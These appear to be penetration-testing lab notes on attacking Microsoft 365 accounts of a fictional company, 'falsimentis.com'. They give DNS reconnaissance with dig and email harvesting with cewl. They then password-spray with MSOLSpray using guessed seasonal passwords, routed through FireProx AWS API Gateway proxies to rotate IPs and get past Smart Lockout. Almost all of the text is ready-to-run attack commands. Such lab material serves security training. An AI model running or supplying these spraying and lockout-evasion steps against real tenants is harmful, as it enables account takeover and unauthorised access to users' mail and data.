# Attacking microsoft 365 passwords notes

recon

```
dig +short @172.30.0.254 MX falsimentis.com
dig +short @172.30.0.254 CNAME autodiscover.falsimentis.com
```

visit these sites and enumerate to understand more, in this case we find emails so let's use cewl to extract them out

```
cewl -d 8 -w words.txt -e --email_file email.txt http://www.falsimentis.com/
```

above will create a words list named words.txt and an email file list named email.txt

## MSOLSpray

now spary these with MSOLSpray tool
[MSOLSpray](https://github.com/dafthack/MSOLSpray)

```
Import-Module /opt/MSOLSpray/MSOLSpray.ps1
Invoke-MSOLSpray -UserList ./email.txt -Password Lakers2020
Invoke-MSOLSpray -UserList ./email.txt -Password Dodgers2020
```

smartlock will lock these so instead let's use fireprox

```
sudo fire.py --command create --url http://myip.sunsetisp.com
curl http://32ptk9jqm0.execute-api.us-east-1.amazonaws.com/
sudo fire.py --command delete --api_id 32ptk9jqm0
```

now use fireprox to create a microsoft login and run the spray against it

```
sudo fire.py --command create --url https://login.microsoft.com
Invoke-MSOLSpray -UserList ./email.txt -Password Dodgers2020 -URL http://9jb82e7504.execute-api.us-east-1.amazonaws.com/ -OutFile ~/msolspray.txt
Get-Content ~/msolspray.txt
Get-Content ~/msolspray.txt | ForEach { ($_ -split ' ')[6] }
Get-Content ~/msolspray.txt | ForEach { ($_ -split ' ')[6] } | Out-File ~/falsimentis-valid-users.txt
```
